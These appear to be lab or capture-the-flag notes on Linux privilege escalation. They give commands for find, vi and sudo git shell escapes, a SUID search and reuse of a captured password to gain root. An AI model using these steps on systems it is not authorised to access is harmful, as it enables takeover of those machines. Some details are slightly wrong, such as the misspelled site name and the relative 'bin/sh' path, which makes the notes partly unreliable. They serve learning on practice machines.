Try privilege escalation by means of breakout Run: 
```
cd
touch DC1
find DC1 -exec "bin/sh" \;
```

Once that is done, check your priviledges:
```
id
```

Might be root now
```
cd /root
ls
```

Check what commands you can run:
```
ls /home/<username>/usr/bin
find / -perm -4000 2>/dev/null
```

# Gain root access with vi and Git
Can you access vi? run: 
```
vi
```
In vi editor, run the following: 
```
:set shell=/bin/bash 
:!/bin/sh
```
 After running the last command, you should get a bash shell like this: 
 ```
 $
 ```
  
  Now try to run su otherusername You might find a error su not found, this is because it does not know where the su command is, so we will need to specify by running: 
  ```
  export PATH=/bin:/usr/bin:$PATH
  ```
  
   Verify that the path has applied: 
   ```
   $ echo $PATH 
   # Example output
   /bin:/usr/bin:/home/tom/usr/bin
   ```

if you previously managed to get a user's password by could not SSH, try to su to the other user using the same password, example:
```
su jerry
```
 
 Now check permissions: 
 ```
 sudo -l
 ```
 See if the user has root access try running and for which apps:
 Example output:

```
(root) NOPASSWD: /usr/bin/git
```

Go to GTFOBins.hithub.io and search for the apps listed and see if you can get a possible root shell using the app. In this example we will use git

This means the user can run git as root

 ```
 sudo git -p --help
 ```
  -p => Paginate 
  
  You should see a colon on the screen (":") If you do not see a colon, make your terminal screen physically smaller or increase your text size so that not everything fit now run: 
  ```
  !/bin/sh
  ```
   
   You should now be root